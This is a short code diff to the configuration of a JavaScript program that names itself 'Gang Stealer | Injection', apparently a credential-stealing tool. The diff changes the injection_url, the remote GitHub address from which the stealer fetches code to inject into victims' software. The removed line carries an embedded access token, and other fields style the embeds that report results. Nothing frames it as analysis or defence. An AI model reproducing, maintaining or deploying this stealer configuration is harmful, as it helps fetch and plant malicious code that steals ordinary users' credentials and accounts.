@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Gang Stealer | Injection', 
   embed_icon: 'https://cdns-images.dzcdn.net/images/cover/6cf530f06454e00016751841027a544b/264x264.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/OhioDucky/dashboard/main/index.js?token=GHSAT0AAAAAACEPGK6T6TLZYUF2HWRN5XEKZE4OVKQ', 
+  injection_url: 'https://raw.githubusercontent.com/OhioDucky/inject/main/index.js', 
   /**
    
    **/
